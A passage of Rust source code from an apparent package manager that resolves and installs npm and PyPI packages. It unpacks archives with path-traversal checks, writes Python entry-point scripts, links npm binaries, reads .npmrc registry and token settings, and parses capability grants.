    collect_npm_local_dependency_links_from_map(&package.dependencies, base_dir, links)?;
    if include_dev_dependencies {
        collect_npm_local_dependency_links_from_map(&package.dev_dependencies, base_dir, links)?;
    }
    collect_npm_local_dependency_links_from_map(&package.optional_dependencies, base_dir, links)?;
    for (name, requirement) in &package.peer_dependencies {
        if package
            .peer_dependencies_meta
            .get(name)
            .map(|meta| meta.optional)
            .unwrap_or(false)
        {
            continue;
        }
        collect_npm_local_dependency_link(name, requirement, base_dir, links)?;
    }
    Ok(())
}

fn collect_npm_local_dependency_links_from_map(
    dependencies: &BTreeMap<String, String>,
    base_dir: &Path,
    links: &mut Vec<NpmLocalLink>,
) -> Result<()> {
    for (name, requirement) in dependencies {
        collect_npm_local_dependency_link(name, requirement, base_dir, links)?;
    }
    Ok(())
}

fn collect_npm_local_dependency_link(
    name: &str,
    requirement: &str,
    base_dir: &Path,
    links: &mut Vec<NpmLocalLink>,
) -> Result<()> {
    let Some(path) = npm_local_directory_requirement_path(requirement.trim(), base_dir)? else {
        return Ok(());
    };
    links.push(NpmLocalLink {
        name: name.to_owned(),
        path,
    });
    Ok(())
}

fn install_nested_npm_dependencies_for_package(
    project_dir: &Path,
    lock: &OmcLock,
    installed_dir: &Path,
    package: &LockedPackage,
    stack: &mut Vec<String>,
) -> Result<()> {
    let key = format!("{}@{}", package.name, package.version);
    if stack.contains(&key) {
        return Ok(());
    }
    stack.push(key);

    let nested_node_modules = installed_dir.join("node_modules");
    for dependency in package
        .dependencies
        .iter()
        .chain(package.optional_dependencies.iter())
    {
        let Ok(spec) = PackageSpec::parse(dependency) else {
            continue;
        };
        if spec.ecosystem != Ecosystem::Npm {
            continue;
        }
        let Some(locked_dependency) = find_locked_npm_dependency(lock, &spec) else {
            continue;
        };
        let dependency_dir =
            install_npm_package_to(project_dir, locked_dependency, &nested_node_modules)?;
        install_nested_npm_dependencies_for_package(
            project_dir,
            lock,
            &dependency_dir,
            locked_dependency,
            stack,
        )?;
    }

    stack.pop();
    Ok(())
}

fn find_locked_npm_dependency<'a>(
    lock: &'a OmcLock,
    spec: &PackageSpec,
) -> Option<&'a LockedPackage> {
    let (_, requirement) = npm_registry_name_and_requirement(spec).ok()?;
    lock.packages
        .iter()
        .filter(|package| package.ecosystem == Ecosystem::Npm && package.name == spec.name)
        .filter(|package| {
            requirement
                .as_deref()
                .map(|requirement| npm_version_satisfies(&package.version, requirement))
                .unwrap_or(true)
        })
        .max_by(|left, right| compare_npm_versions(&left.version, &right.version))
}

fn install_pypi_package(
    project_dir: &Path,
    package: &LockedPackage,
    site_packages: &Path,
    bin_dir: &Path,
) -> Result<usize> {
    let archive_path = project_dir.join(&package.archive);
    if archive_path.extension().and_then(|ext| ext.to_str()) == Some("whl") {
        return install_pypi_wheel_package(project_dir, package, site_packages, bin_dir);
    }
    if archive_path
        .file_name()
        .and_then(|name| name.to_str())
        .map(is_python_sdist_filename)
        .unwrap_or(false)
    {
        return install_pypi_sdist_package(project_dir, package, site_packages, bin_dir);
    }

    Err(OmcRegistryError::UnsupportedInstallArtifact(
        archive_path.display().to_string(),
    ))
}

fn install_pypi_wheel_package(
    project_dir: &Path,
    package: &LockedPackage,
    site_packages: &Path,
    bin_dir: &Path,
) -> Result<usize> {
    let archive_path = project_dir.join(&package.archive);
    if archive_path.extension().and_then(|ext| ext.to_str()) != Some("whl") {
        return Err(OmcRegistryError::UnsupportedInstallArtifact(
            archive_path.display().to_string(),
        ));
    }

    let reader = Cursor::new(read_locked_archive(project_dir, package)?);
    let mut archive = zip::ZipArchive::new(reader)?;
    let mut entry_points = Vec::new();
    for index in 0..archive.len() {
        let mut file = archive.by_index(index)?;
        let output = checked_join(site_packages, Path::new(file.name()))?;

        if file.is_dir() {
            fs::create_dir_all(output)?;
        } else {
            let name = file.name().to_owned();
            let mut bytes = Vec::new();
            file.read_to_end(&mut bytes)?;
            if let Some(parent) = output.parent() {
                fs::create_dir_all(parent)?;
            }
            fs::write(output, &bytes)?;

            if name.ends_with(".dist-info/entry_points.txt") {
                if let Ok(content) = String::from_utf8(bytes) {
                    entry_points.push(content);
                }
            }
        }
    }

    install_python_entry_points(&entry_points, bin_dir)
}

fn install_pypi_sdist_package(
    project_dir: &Path,
    package: &LockedPackage,
    site_packages: &Path,
    bin_dir: &Path,
) -> Result<usize> {
    let source_dir = project_dir
        .join(".omc")
        .join("python")
        .join("sdists")
        .join(safe_name(&package.name))
        .join(&package.version);
    remove_path_if_exists(&source_dir)?;
    fs::create_dir_all(&source_dir)?;

    let archive_path = project_dir.join(&package.archive);
    let archive_filename = archive_path
        .file_name()
        .and_then(|name| name.to_str())
        .ok_or_else(|| OmcRegistryError::UnsupportedInstallArtifact(package.archive.clone()))?;
    unpack_python_sdist(
        &read_locked_archive(project_dir, package)?,
        archive_filename,
        &source_dir,
    )?;
    let import_root = if source_dir.join("src").is_dir() {
        source_dir.join("src")
    } else {
        source_dir.clone()
    };
    copy_python_sdist_import_tree(&import_root, site_packages)?;
    let entry_points = read_python_local_entry_points(&source_dir)?;
    install_python_entry_point_scripts(&entry_points, bin_dir)
}

fn unpack_python_sdist(bytes: &[u8], filename: &str, target: &Path) -> Result<()> {
    if filename.to_ascii_lowercase().ends_with(".zip") {
        return unpack_python_zip_sdist(bytes, target);
    }
    unpack_python_tar_sdist(bytes, target)
}

fn unpack_python_tar_sdist(bytes: &[u8], target: &Path) -> Result<()> {
    let decoder = GzDecoder::new(Cursor::new(bytes));
    let mut archive = Archive::new(decoder);
    for entry in archive.entries()? {
        let mut entry = entry?;
        let raw_path = entry.path()?.to_string_lossy().into_owned();
        if is_ignorable_archive_metadata_path(&raw_path) {
            continue;
        }
        let Some(stripped) = strip_first_path_component(Path::new(&raw_path)) else {
            if entry.header().entry_type().is_dir() {
                continue;
            }
            return Err(OmcRegistryError::UnsafeArchivePath(raw_path));
        };
        let output = checked_join(target, &stripped)?;

        if entry.header().entry_type().is_dir() {
            fs::create_dir_all(output)?;
        } else if entry.header().entry_type().is_file() {
            if let Some(parent) = output.parent() {
                fs::create_dir_all(parent)?;
            }
            entry.unpack(output)?;
        }
    }
    Ok(())
}

fn unpack_python_zip_sdist(bytes: &[u8], target: &Path) -> Result<()> {
    let reader = Cursor::new(bytes);
    let mut archive = zip::ZipArchive::new(reader)?;
    for index in 0..archive.len() {
        let mut file = archive.by_index(index)?;
        let raw_path = file.name().to_owned();
        if is_ignorable_archive_metadata_path(&raw_path) {
            continue;
        }
        let Some(stripped) = strip_first_path_component(Path::new(&raw_path)) else {
            if file.is_dir() {
                continue;
            }
            return Err(OmcRegistryError::UnsafeArchivePath(raw_path));
        };
        let output = checked_join(target, &stripped)?;
        if file.is_dir() {
            fs::create_dir_all(output)?;
        } else {
            if let Some(parent) = output.parent() {
                fs::create_dir_all(parent)?;
            }
            let mut bytes = Vec::new();
            file.read_to_end(&mut bytes)?;
            fs::write(output, bytes)?;
        }
    }
    Ok(())
}

fn copy_python_sdist_import_tree(source: &Path, site_packages: &Path) -> Result<()> {
    for entry in WalkDir::new(source)
        .into_iter()
        .filter_map(|entry| entry.ok())
    {
        if !entry.file_type().is_file() {
            continue;
        }
        let relative = entry.path().strip_prefix(source).unwrap_or(entry.path());
        if !should_copy_python_sdist_path(relative) {
            continue;
        }
        let output = checked_join(site_packages, relative)?;
        if let Some(parent) = output.parent() {
            fs::create_dir_all(parent)?;
        }
        fs::copy(entry.path(), output)?;
    }
    Ok(())
}

fn should_copy_python_sdist_path(path: &Path) -> bool {
    let mut components = path.components();
    let Some(first) = components
        .next()
        .and_then(|component| component.as_os_str().to_str())
    else {
        return false;
    };
    if first.ends_with(".egg-info") || first.ends_with(".dist-info") {
        return false;
    }
    if components.next().is_none()
        && matches!(
            first,
            "PKG-INFO" | "pyproject.toml" | "setup.cfg" | "setup.py" | "setup_requires.py"
        )
    {
        return false;
    }
    true
}

fn is_ignorable_archive_metadata_path(path: &str) -> bool {
    Path::new(path).components().any(|component| {
        let Some(name) = component.as_os_str().to_str() else {
            return false;
        };
        name == "__MACOSX" || name.starts_with("._")
    })
}

fn pypi_wheel_dependencies(
    bytes: &[u8],
    active_extras: &BTreeSet<String>,
) -> Result<Vec<PackageDependency>> {
    let reader = Cursor::new(bytes);
    let mut archive = zip::ZipArchive::new(reader)?;
    let mut dependencies = Vec::new();
    for index in 0..archive.len() {
        let mut file = archive.by_index(index)?;
        if !file.name().ends_with(".dist-info/METADATA") {
            continue;
        }
        let mut metadata = String::new();
        file.read_to_string(&mut metadata)?;
        dependencies.extend(pypi_metadata_dependencies(&metadata, active_extras));
        break;
    }
    Ok(dependencies)
}

fn pypi_sdist_dependencies(
    bytes: &[u8],
    filename: &str,
    active_extras: &BTreeSet<String>,
) -> Result<Vec<PackageDependency>> {
    if filename.to_ascii_lowercase().ends_with(".zip") {
        return pypi_zip_sdist_dependencies(bytes, active_extras);
    }
    pypi_tar_sdist_dependencies(bytes, active_extras)
}

fn pypi_tar_sdist_dependencies(
    bytes: &[u8],
    active_extras: &BTreeSet<String>,
) -> Result<Vec<PackageDependency>> {
    let decoder = GzDecoder::new(Cursor::new(bytes));
    let mut archive = Archive::new(decoder);
    let mut dependencies = Vec::new();
    for entry in archive.entries()? {
        let mut entry = entry?;
        if !entry.header().entry_type().is_file() || entry.size() > MAX_FILE_BYTES {
            continue;
        }
        let path = entry.path()?.to_string_lossy().into_owned();
        if is_ignorable_archive_metadata_path(&path)
            || !(path.ends_with("/PKG-INFO") || path.ends_with(".dist-info/METADATA"))
        {
            continue;
        }
        let mut metadata = String::new();
        entry.read_to_string(&mut metadata)?;
        dependencies.extend(pypi_metadata_dependencies(&metadata, active_extras));
        if !dependencies.is_empty() {
            break;
        }
    }
    Ok(dependencies)
}

fn pypi_zip_sdist_dependencies(
    bytes: &[u8],
    active_extras: &BTreeSet<String>,
) -> Result<Vec<PackageDependency>> {
    let reader = Cursor::new(bytes);
    let mut archive = zip::ZipArchive::new(reader)?;
    let mut dependencies = Vec::new();
    for index in 0..archive.len() {
        let mut file = archive.by_index(index)?;
        if file.is_dir() || file.size() > MAX_FILE_BYTES {
            continue;
        }
        let path = file.name().to_owned();
        if is_ignorable_archive_metadata_path(&path)
            || !(path.ends_with("/PKG-INFO") || path.ends_with(".dist-info/METADATA"))
        {
            continue;
        }
        let mut metadata = String::new();
        file.read_to_string(&mut metadata)?;
        dependencies.extend(pypi_metadata_dependencies(&metadata, active_extras));
        if !dependencies.is_empty() {
            break;
        }
    }
    Ok(dependencies)
}

fn pypi_metadata_dependencies(
    metadata: &str,
    active_extras: &BTreeSet<String>,
) -> Vec<PackageDependency> {
    folded_metadata_lines(metadata)
        .into_iter()
        .filter_map(|line| {
            let requirement = line.strip_prefix("Requires-Dist:")?;
            parse_pypi_requirement_with_extras(requirement.trim(), active_extras).map(|spec| {
                PackageDependency {
                    spec,
                    optional: false,
                }
            })
        })
        .collect()
}

fn folded_metadata_lines(metadata: &str) -> Vec<String> {
    let mut lines: Vec<String> = Vec::new();
    for line in metadata.lines() {
        if line.starts_with(' ') || line.starts_with('\t') {
            if let Some(previous) = lines.last_mut() {
                previous.push(' ');
                previous.push_str(line.trim());
            }
        } else {
            lines.push(line.to_owned());
        }
    }
    lines
}

fn npm_manifest_from_tgz(bytes: &[u8]) -> Result<NpmPackageManifest> {
    let decoder = GzDecoder::new(Cursor::new(bytes));
    let mut archive = Archive::new(decoder);
    for entry in archive.entries()? {
        let mut entry = entry?;
        if !entry.header().entry_type().is_file() {
            continue;
        }
        let path = entry.path()?.to_string_lossy().into_owned();
        if strip_first_path_component(Path::new(&path)).as_deref()
            != Some(Path::new("package.json"))
        {
            continue;
        }
        let mut content = String::new();
        entry.read_to_string(&mut content)?;
        return Ok(serde_json::from_str(&content)?);
    }
    Err(OmcRegistryError::UnsupportedSpec(
        "npm tarball did not contain package.json".to_owned(),
    ))
}

fn npm_manifest_runtime_dependencies(manifest: &NpmPackageManifest) -> Vec<PackageDependency> {
    npm_dependency_fields(
        manifest.dependencies.clone(),
        manifest.optional_dependencies.clone(),
        manifest.bundle_dependencies.as_ref(),
        manifest.bundled_dependencies.as_ref(),
        manifest.peer_dependencies.clone(),
        manifest.peer_dependencies_meta.clone(),
    )
}

fn npm_manifest_platform_compatible(manifest: &NpmPackageManifest) -> bool {
    npm_platform_fields(
        manifest.os.as_ref(),
        manifest.cpu.as_ref(),
        manifest.libc.as_ref(),
    )
}

fn npm_install_target(node_modules: &Path, name: &str) -> PathBuf {
    if let Some((scope, package)) = name.split_once('/') {
        node_modules.join(scope).join(package)
    } else {
        node_modules.join(name)
    }
}

fn install_npm_bins(package_dir: &Path, package_name: &str, bin_dir: &Path) -> Result<usize> {
    let package_json = package_dir.join("package.json");
    if !package_json.exists() {
        return Ok(0);
    }

    let package =
        serde_json::from_str::<NpmInstalledPackageJson>(&fs::read_to_string(package_json)?)?;
    let Some(bin) = package.bin else {
        return Ok(0);
    };

    fs::create_dir_all(bin_dir)?;
    let bins = match bin {
        NpmBinField::String(path) => vec![(
            npm_default_bin_name(package.name.as_deref().unwrap_or(package_name)),
            path,
        )],
        NpmBinField::Map(map) => map.into_iter().collect(),
    };

    let mut installed = 0;
    for (name, relative) in bins {
        if !is_safe_script_name(&name) {
            continue;
        }
        let source = checked_join(package_dir, Path::new(&relative))?;
        if !source.exists() {
            continue;
        }
        make_executable(&source)?;
        let target = bin_dir.join(&name);
        remove_path_if_exists(&target)?;
        create_command_link(&source, &target)?;
        installed += 1;
    }

    Ok(installed)
}

fn install_python_entry_points(entry_points: &[String], bin_dir: &Path) -> Result<usize> {
    let entries = entry_points
        .iter()
        .flat_map(|content| parse_python_entry_points(content))
        .collect::<Vec<_>>();
    install_python_entry_point_scripts(&entries, bin_dir)
}

fn install_python_entry_point_scripts(
    entry_points: &[PythonEntryPoint],
    bin_dir: &Path,
) -> Result<usize> {
    fs::create_dir_all(bin_dir)?;
    let mut installed = 0;

    for entry in entry_points {
        if !is_safe_script_name(&entry.name) {
            continue;
        }
        let target = bin_dir.join(&entry.name);
        remove_path_if_exists(&target)?;
        fs::write(&target, python_entry_point_script(entry))?;
        make_executable(&target)?;
        installed += 1;
    }

    Ok(installed)
}

fn read_python_local_entry_points(package_dir: &Path) -> Result<Vec<PythonEntryPoint>> {
    let mut entries = Vec::new();

    let pyproject = package_dir.join("pyproject.toml");
    if pyproject.exists() {
        let pyproject = toml::from_str::<PyProjectToml>(&fs::read_to_string(pyproject)?)?;
        if let Some(project) = pyproject.project {
            collect_python_script_entries(project.scripts, &mut entries);
            collect_python_script_entries(project.gui_scripts, &mut entries);
        }
        if let Some(poetry) = pyproject.tool.and_then(|tool| tool.poetry) {
            collect_poetry_script_entries(poetry.scripts, &mut entries);
        }
    }

    let setup_cfg = package_dir.join("setup.cfg");
    if setup_cfg.exists() {
        entries.extend(read_setup_cfg_entry_points(&setup_cfg)?);
    }

    let setup_py = package_dir.join("setup.py");
    if setup_py.exists() {
        entries.extend(read_setup_py_entry_points(&setup_py)?);
    }

    Ok(entries)
}

fn read_setup_cfg_entry_points(path: &Path) -> Result<Vec<PythonEntryPoint>> {
    Ok(parse_setup_cfg_entry_points(&fs::read_to_string(path)?))
}

fn read_setup_py_entry_points(path: &Path) -> Result<Vec<PythonEntryPoint>> {
    Ok(parse_setup_py_entry_points(&fs::read_to_string(path)?))
}

fn parse_setup_py_entry_points(content: &str) -> Vec<PythonEntryPoint> {
    let selected_groups = BTreeSet::from(["console-scripts".to_owned(), "gui-scripts".to_owned()]);
    let mut entries = Vec::new();

    for value in python_keyword_assignment_values(content, "entry_points") {
        entries.extend(
            python_string_dict_values(value, &selected_groups)
                .into_iter()
                .filter_map(|line| python_entry_point_from_assignment(&line)),
        );
        for entry_points_ini in python_string_literals(value) {
            entries.extend(parse_python_entry_points(&entry_points_ini));
        }
    }

    entries
}

fn parse_setup_cfg_entry_points(content: &str) -> Vec<PythonEntryPoint> {
    let mut in_entry_points = false;
    let mut in_supported_group = false;
    let mut entries = Vec::new();

    for raw_line in content.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        if line.starts_with('[') && line.ends_with(']') {
            in_entry_points = line[1..line.len() - 1]
                .trim()
                .eq_ignore_ascii_case("options.entry_points");
            in_supported_group = false;
            continue;
        }
        if !in_entry_points {
            continue;
        }

        if let Some((key, value)) = setup_cfg_key_value(line) {
            if matches!(key.as_str(), "console_scripts" | "gui_scripts") {
                in_supported_group = true;
                if let Some(entry) = python_entry_point_from_assignment(value) {
                    entries.push(entry);
                }
                continue;
            }
        }

        let is_continuation = raw_line
            .chars()
            .next()
            .map(char::is_whitespace)
            .unwrap_or(false);
        if !in_supported_group || !is_continuation {
            continue;
        }
        if let Some(entry) = python_entry_point_from_assignment(line) {
            entries.push(entry);
        }
    }

    entries
}

fn collect_python_script_entries(
    scripts: BTreeMap<String, String>,
    entries: &mut Vec<PythonEntryPoint>,
) {
    entries.extend(
        scripts
            .into_iter()
            .filter_map(|(name, target)| python_entry_point_from_script(&name, &target)),
    );
}

fn collect_poetry_script_entries(
    scripts: BTreeMap<String, PoetryScript>,
    entries: &mut Vec<PythonEntryPoint>,
) {
    entries.extend(
        scripts
            .into_iter()
            .filter_map(|(name, script)| match script {
                PoetryScript::Target(target) => python_entry_point_from_script(&name, &target),
                PoetryScript::Table { callable } => {
                    callable.and_then(|target| python_entry_point_from_script(&name, &target))
                }
            }),
    );
}

fn parse_python_entry_points(content: &str) -> Vec<PythonEntryPoint> {
    let mut in_supported_scripts = false;
    let mut entries = Vec::new();

    for raw_line in content.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if line.starts_with('[') && line.ends_with(']') {
            in_supported_scripts = matches!(line, "[console_scripts]" | "[gui_scripts]");
            continue;
        }
        if !in_supported_scripts {
            continue;
        }

        if let Some(entry) = python_entry_point_from_assignment(line) {
            entries.push(entry);
        }
    }

    entries
}

fn python_entry_point_from_assignment(line: &str) -> Option<PythonEntryPoint> {
    let (name, target) = line.split_once('=')?;
    python_entry_point_from_script(name, target)
}

fn python_entry_point_from_script(name: &str, target: &str) -> Option<PythonEntryPoint> {
    let target = target.split('[').next().unwrap_or(target).trim();
    let (module, function) = target.split_once(':')?;
    let module = module.trim();
    let function = function.trim();
    if module.is_empty() || function.is_empty() {
        return None;
    }
    Some(PythonEntryPoint {
        name: name.trim().to_owned(),
        module: module.to_owned(),
        function: function.to_owned(),
    })
}

fn python_entry_point_script(entry: &PythonEntryPoint) -> String {
    format!(
        r#"#!/usr/bin/env python3
from pathlib import Path
import re
import sys

_python_dir = Path(__file__).resolve().parents[1]
_site_packages = str(_python_dir / "site-packages")
_project_paths = [_site_packages]
_local_paths = _python_dir / "local-paths"
if _local_paths.exists():
    _project_paths.extend(
        line.strip()
        for line in _local_paths.read_text().splitlines()
        if line.strip()
    )
sys.path = _project_paths + [
    path for path in sys.path
    if path not in _project_paths
    and "site-packages" not in path
    and "dist-packages" not in path
]

from {module} import {function}

if __name__ == "__main__":
    sys.argv[0] = re.sub(r"(-script\.pyw|\.exe)?$", "", sys.argv[0])
    sys.exit({function}())
"#,
        module = entry.module,
        function = entry.function
    )
}

fn npm_default_bin_name(package_name: &str) -> String {
    package_name
        .rsplit('/')
        .next()
        .unwrap_or(package_name)
        .to_owned()
}

fn is_safe_script_name(name: &str) -> bool {
    !name.is_empty()
        && !name.contains('/')
        && !name.contains('\\')
        && !name.contains(std::path::MAIN_SEPARATOR)
        && name != "."
        && name != ".."
}

fn remove_path_if_exists(path: &Path) -> Result<()> {
    match fs::symlink_metadata(path) {
        Ok(metadata) if metadata.is_dir() && !metadata.file_type().is_symlink() => {
            fs::remove_dir_all(path)?;
        }
        Ok(_) => {
            fs::remove_file(path)?;
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
        Err(error) => return Err(error.into()),
    }
    Ok(())
}

#[cfg(unix)]
fn create_command_link(source: &Path, target: &Path) -> Result<()> {
    std::os::unix::fs::symlink(source, target)?;
    Ok(())
}

#[cfg(not(unix))]
fn create_command_link(source: &Path, target: &Path) -> Result<()> {
    fs::write(
        target,
        format!("@echo off\r\nnode \"{}\" %*\r\n", source.display()),
    )?;
    Ok(())
}

#[cfg(unix)]
fn create_directory_link(source: &Path, target: &Path) -> Result<()> {
    std::os::unix::fs::symlink(source, target)?;
    Ok(())
}

#[cfg(not(unix))]
fn create_directory_link(source: &Path, target: &Path) -> Result<()> {
    copy_dir_all(source, target)
}

#[cfg(not(unix))]
fn copy_dir_all(source: &Path, target: &Path) -> Result<()> {
    fs::create_dir_all(target)?;
    for entry in fs::read_dir(source)? {
        let entry = entry?;
        let source_path = entry.path();
        let target_path = target.join(entry.file_name());
        if entry.file_type()?.is_dir() {
            copy_dir_all(&source_path, &target_path)?;
        } else {
            fs::copy(&source_path, &target_path)?;
        }
    }
    Ok(())
}

#[cfg(unix)]
fn make_executable(path: &Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;

    let mut permissions = fs::metadata(path)?.permissions();
    permissions.set_mode(0o755);
    fs::set_permissions(path, permissions)?;
    Ok(())
}

#[cfg(not(unix))]
fn make_executable(_path: &Path) -> Result<()> {
    Ok(())
}

fn strip_first_path_component(path: &Path) -> Option<PathBuf> {
    let mut components = path.components();
    components.next()?;
    let stripped = components.as_path();
    (!stripped.as_os_str().is_empty()).then(|| stripped.to_path_buf())
}

fn checked_join(base: &Path, relative: &Path) -> Result<PathBuf> {
    if relative.is_absolute()
        || relative
            .components()
            .any(|component| matches!(component, std::path::Component::ParentDir))
    {
        return Err(OmcRegistryError::UnsafeArchivePath(
            relative.display().to_string(),
        ));
    }
    Ok(base.join(relative))
}

pub fn parse_capability_grant(value: &str) -> Result<Capability> {
    if value == "dynamic-eval" || value == "dynamic.eval" {
        return Ok(Capability::DynamicEval);
    }
    if value == "time.now" || value == "time" {
        return Ok(Capability::TimeNow);
    }
    if value == "random.bytes" || value == "random" {
        return Ok(Capability::RandomBytes);
    }

    let (kind, target) = value
        .split_once(':')
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(value.to_owned()))?;
    let target = target.to_owned();

    match kind {
        "env" | "env.read" | "env-read" => Ok(Capability::EnvRead(target)),
        "fs.read" | "fs-read" => Ok(Capability::FsRead(target)),
        "fs.write" | "fs-write" => Ok(Capability::FsWrite(target)),
        "http" | "network" => Ok(Capability::HttpHost(target)),
        "dns" => Ok(Capability::DnsHost(target)),
        "proc" | "proc.spawn" | "proc-spawn" => Ok(Capability::ProcSpawn(target)),
        _ => Err(OmcRegistryError::UnsupportedSpec(value.to_owned())),
    }
}

#[derive(Debug, Clone)]
struct NpmConfig {
    registry: String,
    scoped_registries: BTreeMap<String, String>,
    auth_tokens: Vec<NpmAuthToken>,
}

#[derive(Debug, Clone)]
struct NpmAuthToken {
    scope: String,
    token: String,
}

impl Default for NpmConfig {
    fn default() -> Self {
        Self {
            registry: "https://registry.npmjs.org/".to_owned(),
            scoped_registries: BTreeMap::new(),
            auth_tokens: Vec::new(),
        }
    }
}

impl NpmConfig {
    fn registry_for(&self, package: &str) -> &str {
        let Some((scope, _)) = package.split_once('/') else {
            return &self.registry;
        };
        self.scoped_registries
            .get(scope)
            .map(String::as_str)
            .unwrap_or(&self.registry)
    }

    fn auth_token_for_url(&self, url: &str) -> Option<&str> {
        let url = reqwest::Url::parse(url).ok()?;
        let host = url.host_str()?;
        let target = format!("{host}{}", url.path());
        self.auth_tokens
            .iter()
            .filter(|token| target.starts_with(&token.scope))
            .max_by_key(|token| token.scope.len())
            .map(|token| token.token.as_str())
    }
}

fn read_npm_config(project_dir: &Path) -> Result<NpmConfig> {
    let mut config = NpmConfig::default();
    if let Some(home) = env::var_os("HOME") {
        read_npmrc_into(&PathBuf::from(home).join(".npmrc"), &mut config)?;
    }
    read_npmrc_into(&project_dir.join(".npmrc"), &mut config)?;
    Ok(config)
}

fn read_npmrc_into(path: &Path, config: &mut NpmConfig) -> Result<()> {
    if !path.exists() {
        return Ok(());
    }
    parse_npmrc_content(&fs::read_to_string(path)?, config);
    Ok(())
}

fn parse_npmrc_content(content: &str, config: &mut NpmConfig) {
    for raw_line in content.lines() {
        let line = strip_npmrc_comment(raw_line).trim();
        if line.is_empty() {
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let key = key.trim();
        let Some(value) = expand_npmrc_value(value.trim()) else {
            continue;
        };

        if key == "registry" {
            if let Some(registry) = normalize_npm_registry(&value) {
                config.registry = registry;
            }
        } else if key.starts_with('@') && key.ends_with(":registry") {
            if let Some(registry) = normalize_npm_registry(&value) {
                let scope = key.trim_end_matches(":registry").to_owned();
                config.scoped_registries.insert(scope, registry);
            }
        } else if key.starts_with("//") && key.ends_with(":_authToken") {
            let scope = key
                .trim_start_matches("//")
                .trim_end_matches(":_authToken")
                .trim_start_matches('/')
                .to_owned();
            if !scope.is_empty() && !value.is_empty() {
                config.auth_tokens.push(NpmAuthToken {
                    scope: ensure_trailing_slash(&scope),
                    token: value,
                });
            }
        }
    }
}

fn strip_npmrc_comment(line: &str) -> &str {
    let trimmed = line.trim_start();
    if trimmed.starts_with('#') || trimmed.starts_with(';') {
        return "";
    }
    for (index, ch) in line.char_indices() {
        let previous_was_whitespace = line[..index]
            .chars()
            .last()
            .map(char::is_whitespace)
            .unwrap_or(false);
        if matches!(ch, '#' | ';') && previous_was_whitespace {
            return &line[..index];
        }
    }
    line
}

fn normalize_npm_registry(value: &str) -> Option<String> {
    let value = value.trim();
    if value.is_empty() {
        None
    } else {
        Some(ensure_trailing_slash(value))
    }
}

fn ensure_trailing_slash(value: &str) -> String {
    if value.ends_with('/') {
        value.to_owned()
    } else {
        format!("{value}/")
    }
}

fn expand_npmrc_value(value: &str) -> Option<String> {
    let mut expanded = String::new();
    let mut rest = value.trim().trim_matches('"');
    while let Some(start) = rest.find("${") {
        expanded.push_str(&rest[..start]);
        let after_start = &rest[start + 2..];
        let end = after_start.find('}')?;
        let key = &after_start[..end];
        expanded.push_str(&env::var(key).ok()?);
        rest = &after_start[end + 1..];
    }
    expanded.push_str(rest);
    Some(expanded)
}

fn npm_registry_package_url(registry: &str, encoded: &str) -> String {
    format!("{}{}", ensure_trailing_slash(registry), encoded)
}

fn npm_registry_package_version_url(registry: &str, encoded: &str, version: &str) -> String {
    format!("{}{encoded}/{version}", ensure_trailing_slash(registry))
}

fn npm_get(client: &Client, url: &str, config: &NpmConfig) -> reqwest::blocking::RequestBuilder {
    let request = client.get(url);
    if let Some(token) = config.auth_token_for_url(url) {
        request.bearer_auth(token)
    } else {
        request
    }
}

fn resolve_package(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
) -> Result<ResolvedPackage> {
    match spec.ecosystem {
        Ecosystem::Npm => resolve_npm(client, spec, options),
        Ecosystem::Pypi => resolve_pypi(client, spec, options),
    }
}

fn resolve_npm(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
) -> Result<ResolvedPackage> {
    if spec.direct_url.is_some() {
        return resolve_npm_direct_tarball(client, spec, options);
    }

    let (registry_name, version_requirement) = npm_registry_name_and_requirement(spec)?;
    let install_name = spec.name.clone();
    if let Some(resolved) =
        resolve_npm_lockfile_tarball(spec, &install_name, version_requirement.as_deref(), options)?
    {
        return Ok(resolved);
    }

    let npm_config = read_npm_config(&options.project_dir)?;
    let registry = npm_config.registry_for(&registry_name);
    let encoded = urlencoding::encode(&registry_name);
    let constrained_requirement =
        constrained_npm_requirement(spec, version_requirement.as_deref(), &options.constraints);
    let version = match constrained_requirement.as_deref() {
        Some(requirement) if is_exact_npm_version(requirement) => requirement.to_owned(),
        Some(requirement) => {
            let url = npm_registry_package_url(registry, &encoded);
            let root = npm_get(client, &url, &npm_config)
                .send()?
                .error_for_status()?
                .json::<NpmRoot>()?;
            choose_npm_version(&registry_name, requirement, &root)?
        }
        None => {
            let url = npm_registry_package_url(registry, &encoded);
            let root = npm_get(client, &url, &npm_config)
                .send()?
                .error_for_status()?
                .json::<NpmRoot>()?;
            root.dist_tags.latest
        }
    };
    let url = npm_registry_package_version_url(registry, &encoded, &version);
    let response = npm_get(client, &url, &npm_config).send()?;
    if response.status().as_u16() == 404 {
        return Err(OmcRegistryError::PackageNotFound(spec.requested()));
    }
    let version_doc = response.error_for_status()?.json::<NpmVersion>()?;
    let platform_compatible = npm_platform_compatible(&version_doc);
    let dependencies = npm_runtime_dependencies(&version_doc);
    let filename = version_doc
        .dist
        .tarball
        .rsplit('/')
        .next()
        .unwrap_or("package.tgz")
        .to_owned();

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: install_name,
        version: version_doc.version,
        source_url: version_doc.dist.tarball,
        download_url: None,
        local_path: None,
        filename,
        expected_sha256: None,
        expected_sha1: version_doc.dist.shasum,
        expected_integrity: version_doc.dist.integrity,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: version_doc.scripts.unwrap_or_default(),
        platform_compatible,
        dependencies,
    })
}

fn resolve_npm_direct_tarball(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
) -> Result<ResolvedPackage> {
    let source_url = spec
        .direct_url
        .clone()
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(spec.requested()))?;
    let (local_path, filename) = npm_direct_tarball_source(&source_url, &spec.name)?;
    let preliminary = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: spec.name.clone(),
        version: "0.0.0".to_owned(),
        source_url: source_url.clone(),
        download_url: None,
        local_path: local_path.clone(),
        filename: filename.clone(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: true,
        pypi_direct_wheel: false,
